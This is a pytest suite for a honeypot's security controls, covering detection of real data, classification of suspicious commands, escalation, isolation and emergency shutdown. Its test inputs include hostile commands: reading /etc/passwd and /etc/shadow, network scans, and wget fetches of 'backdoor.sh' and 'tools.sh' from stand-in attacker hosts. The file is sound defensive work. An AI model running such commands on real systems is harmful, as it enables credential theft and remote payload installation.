"""
Test suite for Task 4.3: Security Controls and Real Data Protection
Tests the enhanced security controls, real data detection, escalation procedures,
session isolation, and emergency termination capabilities.
"""

import pytest
import asyncio
import json
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch

from agents.interaction.security_controls import SecurityControls
from agents.interaction.interaction_agent import InteractionAgent


class TestSecurityControlsTask43:
    """Test enhanced security controls for Task 4.3"""
    
    @pytest.fixture
    def security_controls(self):
        """Create SecurityControls instance for testing"""
        config = {
            "security_level": "high",
            "real_data_detection_enabled": True,
            "escalation_enabled": True,
            "isolation_enabled": True
        }
        return SecurityControls(config)
    
    @pytest.fixture
    def interaction_agent(self):
        """Create InteractionAgent instance for testing"""
        config = {
            "security_level": "high",
            "ai_model": "test_model"
        }
        return InteractionAgent(config)
    
    @pytest.mark.asyncio
    async def test_real_data_detection_comprehensive(self, security_controls):
        """Test comprehensive real data detection capabilities"""
        
        # Test cases with different types of real data
        test_cases = [
            {
                "data": "My password is MySecretPass123 for the admin account",
                "expected_detected": True,
                "expected_categories": ["credentials"],
                "expected_risk": "high"
            },
            {
                "data": "SSN: 123-45-6789, Credit Card: 4532-1234-5678-9012",
                "expected_detected": True,
                "expected_categories": ["personal_data"],
                "expected_risk": "critical"
            },
            {
                "data": "Contact john.doe@realcompany.com for access to production server",
                "expected_detected": True,
                "expected_categories": ["personal_data", "network_info"],
                "expected_risk": "medium"
            },
            {
                "data": "This is synthetic test data with SYNTHETIC_DATA marker",
                "expected_detected": False,
                "expected_categories": [],
                "expected_risk": "minimal"
            },
            {
                "data": "ls -la /home/synthetic/test_files",
                "expected_detected": False,
                "expected_categories": [],
                "expected_risk": "minimal"
            }
        ]
        
        for i, test_case in enumerate(test_cases):
            print(f"\nTest case {i+1}: {test_case['data'][:50]}...")
            
            context = {
                "honeypot_type": "ssh",
                "session_id": f"test_session_{i}",
                "synthetic_marker": "SYNTHETIC_DATA" if "SYNTHETIC_DATA" in test_case["data"] else None
            }
            
            result = await security_controls.detect_real_data(test_case["data"], context)
            
            # Verify detection results
            assert result["real_data_detected"] == test_case["expected_detected"], \
                f"Detection mismatch for case {i+1}"
            
            if test_case["expected_detected"]:
                assert result["confidence_score"] > 0.1, \
                    f"Confidence too low for detected real data in case {i+1}"
                
                # Check if expected categories are detected
                detected_categories = result["detection_categories"]
                for expected_cat in test_case["expected_categories"]:
                    assert any(expected_cat in cat for cat in detected_categories), \
                        f"Expected category '{expected_cat}' not found in case {i+1}"
            
            print(f"✓ Case {i+1} passed: detected={result['real_data_detected']}, "
                  f"confidence={result['confidence_score']:.3f}, "
                  f"risk={result['risk_level']}")
    
    @pytest.mark.asyncio
    async def test_suspicious_activity_detection(self, security_controls):
        """Test suspicious activity pattern detection"""
        
        test_cases = [
            {
                "input": "nmap -sS 192.168.1.0/24",
                "expected_detected": True,
                "expected_categories": ["reconnaissance"],
                "expected_threat_level": "medium"
            },
            {
                "input": "cat /etc/passwd && grep root /etc/shadow",
                "expected_detected": True,
                "expected_categories": ["credential_harvesting"],
                "expected_threat_level": "high"
            },
            {
                "input": "ssh admin@10.0.0.5 'wget http://malicious.com/backdoor.sh'",
                "expected_detected": True,
                "expected_categories": ["lateral_movement"],
                "expected_threat_level": "high"
            },
            {
                "input": "sudo su - && crontab -e",
                "expected_detected": True,
                "expected_categories": ["privilege_escalation", "persistence"],
                "expected_threat_level": "high"
            },
            {
                "input": "ls -la /home/user/documents",
                "expected_detected": False,
                "expected_categories": [],
                "expected_threat_level": "low"
            }
        ]
        
        for i, test_case in enumerate(test_cases):
            print(f"\nSuspicious activity test {i+1}: {test_case['input'][:50]}...")
            
            session_context = {
                "session_id": f"test_session_{i}",
                "honeypot_type": "ssh",
                "interaction_count": 5
            }
            
            result = await security_controls.analyze_suspicious_activity(
                test_case["input"], session_context
            )
            
            # Verify detection results
            assert result["suspicious_activity_detected"] == test_case["expected_detected"], \
                f"Suspicious activity detection mismatch for case {i+1}"
            
            if test_case["expected_detected"]:
                # Check threat level
                assert result["threat_level"] == test_case["expected_threat_level"], \
                    f"Threat level mismatch for case {i+1}"
                
                # Check categories
                detected_categories = [cat["category"] for cat in result["activity_categories"]]
                for expected_cat in test_case["expected_categories"]:
                    assert expected_cat in detected_categories, \
                        f"Expected category '{expected_cat}' not found in case {i+1}"
            
            print(f"✓ Case {i+1} passed: detected={result['suspicious_activity_detected']}, "
                  f"threat_level={result['threat_level']}")
    
    @pytest.mark.asyncio
    async def test_escalation_procedures(self, security_controls):
        """Test escalation trigger detection and procedures"""
        
        # Test immediate escalation triggers
        session_data_immediate = {
            "session_id": "test_escalation_immediate",
            "flags": {"real_data_detected": True},
            "failed_auth_count": 5,
            "interaction_count": 15
        }
        
        activity_analysis_immediate = {
            "suspicious_activity_detected": True,
            "threat_level": "high",
            "activity_categories": [
                {"category": "lateral_movement", "match_count": 3},
                {"category": "privilege_escalation", "match_count": 2}
            ]
        }
        
        escalation_result = await security_controls.check_escalation_triggers(
            session_data_immediate, activity_analysis_immediate
        )
        
        # Verify immediate escalation
        assert escalation_result["escalation_required"] == True
        assert escalation_result["escalation_level"] == "immediate"
        assert "emergency_shutdown" in escalation_result["immediate_actions"]
        assert len(escalation_result["escalation_contacts"]) > 0
        
        print("✓ Immediate escalation test passed")
        
        # Test high priority escalation
        session_data_high = {
            "session_id": "test_escalation_high",
            "flags": {"real_data_detected": False},
            "failed_auth_count": 2,
            "interaction_count": 25
        }
        
        # Create activity analysis without privilege escalation for high priority test
        activity_analysis_high = {
            "suspicious_activity_detected": True,
            "threat_level": "high",
            "activity_categories": [
                {"category": "lateral_movement", "match_count": 3},
                {"category": "data_exfiltration", "match_count": 1}
            ]
        }
        
        escalation_result = await security_controls.check_escalation_triggers(
            session_data_high, activity_analysis_high
        )
        
        # Verify high priority escalation
        assert escalation_result["escalation_required"] == True
        assert escalation_result["escalation_level"] == "high"
        
        print("✓ High priority escalation test passed")
        
        # Test no escalation needed
        session_data_normal = {
            "session_id": "test_escalation_normal",
            "flags": {"real_data_detected": False},
            "failed_auth_count": 1,
            "interaction_count": 5
        }
        
        normal_activity = {
            "suspicious_activity_detected": False,
            "threat_level": "low",
            "activity_categories": []
        }
        
        escalation_result = await security_controls.check_escalation_triggers(
            session_data_normal, normal_activity
        )
        
        # Verify no escalation
        assert escalation_result["escalation_required"] == False
        assert escalation_result["escalation_level"] == "none"
        
        print("✓ No escalation test passed")
    
    @pytest.mark.asyncio
    async def test_session_isolation_mechanisms(self, security_controls):
        """Test session isolation and containment mechanisms"""
        
        session_id = "test_isolation_session"
        
        # Test standard isolation
        isolation_result = await security_controls.implement_session_isolation(
            session_id, "standard"
        )
        
        assert isolation_result["containment_active"] == True
        assert isolation_result["isolation_level"] == "standard"
        assert "network_egress_blocking" in isolation_result["isolation_measures"]
        assert "no_external_network_access" in isolation_result["restrictions_applied"]
        
        print("✓ Standard isolation test passed")
        
        # Test enhanced isolation
        isolation_result = await security_controls.implement_session_isolation(
            session_id, "enhanced"
        )
        
        assert isolation_result["isolation_level"] == "enhanced"
        assert "deep_packet_inspection" in isolation_result["isolation_measures"]
        assert "system_calls_monitored" in isolation_result["restrictions_applied"]
        
        print("✓ Enhanced isolation test passed")
        
        # Test maximum isolation
        isolation_result = await security_controls.implement_session_isolation(
            session_id, "maximum"
        )
        
        assert isolation_result["isolation_level"] == "maximum"
        assert "complete_network_isolation" in isolation_result["isolation_measures"]
        assert "zero_network_connectivity" in isolation_result["restrictions_applied"]
        
        print("✓ Maximum isolation test passed")
    
    @pytest.mark.asyncio
    async def test_emergency_termination_procedures(self, security_controls):
        """Test emergency termination and safety controls"""
        
        session_id = "test_emergency_session"
        
        # Test emergency termination for real data detection
        termination_result = await security_controls.implement_emergency_termination(
            session_id, "real_data_detected", immediate=True
        )
        
        assert termination_result["session_id"] == session_id
        assert termination_result["termination_reason"] == "real_data_detected"
        assert termination_result["immediate"] == True
        assert termination_result["forensic_data_preserved"] == True
        assert "forensic_data_id" in termination_result
        
        print("✓ Emergency termination for real data test passed")
        
        # Test emergency termination for pivot attempt
        termination_result = await security_controls.implement_emergency_termination(
            session_id, "pivot_attempt", immediate=True
        )
        
        assert termination_result["termination_reason"] == "pivot_attempt"
        assert termination_result["escalation_triggered"] == True
        
        print("✓ Emergency termination for pivot attempt test passed")
    
    @pytest.mark.asyncio
    async def test_comprehensive_security_scan(self, security_controls):
        """Test comprehensive security scanning functionality"""
        
        # Test high-risk session with multiple violations
        high_risk_session = {
            "session_id": "test_comprehensive_high_risk",
            "start_time": (datetime.utcnow() - timedelta(hours=2)).isoformat(),
            "interaction_count": 75,
            "failed_auth_count": 4,
            "flags": {"suspicious_activity": True}
        }
        
        malicious_input = "cat /etc/passwd && nmap -sS 192.168.1.0/24 && ssh admin@prod.server.com"
        
        scan_result = await security_controls.comprehensive_security_scan(
            high_risk_session, malicious_input
        )
        
        assert scan_result["overall_risk_level"] in ["high", "critical"]
        assert len(scan_result["security_violations"]) > 0
        assert scan_result["immediate_escalation_required"] == True
        assert "immediate_escalation" in scan_result["recommended_actions"]
        
        print("✓ High-risk comprehensive scan test passed")
        
        # Test low-risk session with normal activity
        low_risk_session = {
            "session_id": "test_comprehensive_low_risk",
            "start_time": (datetime.utcnow() - timedelta(minutes=10)).isoformat(),  # 10 minutes ago
            "interaction_count": 5,
            "failed_auth_count": 0,
            "flags": {}
        }
        
        normal_input = "ls -la /home/synthetic/documents"
        
        scan_result = await security_controls.comprehensive_security_scan(
            low_risk_session, normal_input
        )
        
        assert scan_result["overall_risk_level"] == "low"
        assert len(scan_result["security_violations"]) == 0
        assert scan_result["immediate_escalation_required"] == False
        
        print("✓ Low-risk comprehensive scan test passed")
    
    @pytest.mark.asyncio
    async def test_pivot_attempt_detection(self, security_controls):
        """Test lateral movement and pivot attempt detection"""
        
        session_data = {
            "session_id": "test_pivot_session",
            "interaction_count": 20,
            "conversation_state": {
                "technical_depth_progression": [0.2, 0.3, 0.4, 0.7, 0.8, 0.9]
            }
        }
        
        # Test network scanning pivot attempt
        pivot_input = "for i in {1..254}; do ping -c 1 192.168.1.$i; done"
        
        pivot_result = await security_controls.detect_pivot_attempts(session_data, pivot_input)
        
        assert pivot_result["pivot_detected"] == True
        assert "network_scanning" in pivot_result["all_detected_types"]
        assert pivot_result["confidence"] > 0.5
        assert pivot_result["recommended_action"] in ["enhanced_monitoring", "immediate_escalation"]
        
        print("✓ Network scanning pivot detection test passed")
        
        # Test lateral movement pivot attempt
        lateral_input = "ssh admin@10.0.0.5 'wget http://attacker.com/tools.sh && chmod +x tools.sh'"
        
        pivot_result = await security_controls.detect_pivot_attempts(session_data, lateral_input)
        
        assert pivot_result["pivot_detected"] == True
        assert "lateral_movement" in pivot_result["all_detected_types"]
        
        print("✓ Lateral movement pivot detection test passed")
    
    @pytest.mark.asyncio
    async def test_emergency_shutdown_procedures(self, security_controls):
        """Test comprehensive emergency shutdown procedures"""
        
        session_id = "test_emergency_shutdown"
        
        # Test emergency shutdown for real data detection
        shutdown_result = await security_controls.emergency_shutdown(
            "real_data_detected", session_id
        )
        
        assert shutdown_result["reason"] == "real_data_detected"
        assert shutdown_result["session_id"] == session_id
        assert "session_isolated" in shutdown_result["actions_taken"]
        assert "forensic_data_preserved" in shutdown_result["actions_taken"]
        assert "network_connections_terminated" in shutdown_result["actions_taken"]
        assert "administrators_alerted" in shutdown_result["actions_taken"]
        assert shutdown_result["forensic_preservation"] == True
        
        print("✓ Emergency shutdown for real data test passed")
        
        # Test emergency shutdown for security violation
        shutdown_result = await security_controls.emergency_shutdown(
            "security_violation", session_id
        )
        
        assert shutdown_result["reason"] == "security_violation"
        assert len(shutdown_result["safety_measures_activated"]) > 0
        assert len(shutdown_result["escalation_notifications"]) > 0
        
        print("✓ Emergency shutdown for security violation test passed")
    
    @pytest.mark.asyncio
    async def test_integration_with_interaction_agent(self, interaction_agent):
        """Test integration between security controls and interaction agent"""
        
        # Initialize the interaction agent
        await interaction_agent.initialize()
        
        # Start a test session
        start_message = {
            "type": "start_interaction",
            "honeypot_type": "ssh",
            "attacker_ip": "192.168.1.100"
        }
        
        session_result = await interaction_agent.process_message(start_message)
        session_id = session_result["session_id"]
        
        # Test processing malicious input that should trigger security controls
        malicious_message = {
            "type": "attacker_input",
            "session_id": session_id,
            "input": "cat /etc/passwd && my real password is RealPass123"
        }
        
        # This should trigger real data detection and escalation
        with patch.object(interaction_agent.security_controls, 'emergency_shutdown', 
                         new_callable=AsyncMock) as mock_shutdown:
            
            response = await interaction_agent.process_message(malicious_message)
            
            # Verify that security controls were triggered
            assert "escalation" in response
            assert response["escalation"]["escalation_type"] == "security_violation"
            
            # Verify emergency shutdown was called for real data
            mock_shutdown.assert_called()
        
        print("✓ Integration with interaction agent test passed")
        
        # Clean up
        await interaction_agent.cleanup()
    
    @pytest.mark.asyncio
    async def test_data_quarantine_procedures(self, security_controls):
        """Test data quarantine and handling procedures"""
        
        # Test quarantining real data
        real_data = "User credentials: admin/MyRealPassword123"
        detection_results = {
            "real_data_detected": True,
            "confidence_score": 0.95,
            "detection_categories": ["credentials"],
            "risk_level": "critical"
        }
        
        context = {
            "session_id": "test_quarantine_session",
            "honeypot_type": "ssh"
        }
        
        # This should trigger quarantine
        await security_controls._quarantine_data(real_data, detection_results, context)
        
        # Verify quarantine was recorded
        quarantine_summary = security_controls.get_quarantined_data_summary()
        assert quarantine_summary["quarantined_items"] > 0
        assert "credentials" in quarantine_summary["categories"]
        
        print("✓ Data quarantine procedures test passed")
    
    def test_security_status_reporting(self, security_controls):
        """Test security status and monitoring capabilities"""
        
        # Get security status
        status = security_controls.get_security_status()
        
        assert "quarantined_data_count" in status
        assert "escalation_history_count" in status
        assert "emergency_triggers_count" in status
        assert "isolation_controls_active" in status
        assert "real_data_patterns_loaded" in status
        assert "suspicious_patterns_loaded" in status
        
        # Verify patterns are loaded
        assert status["real_data_patterns_loaded"] > 0
        assert status["suspicious_patterns_loaded"] > 0
        assert status["isolation_controls_active"] == True
        
        print("✓ Security status reporting test passed")


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "-s"])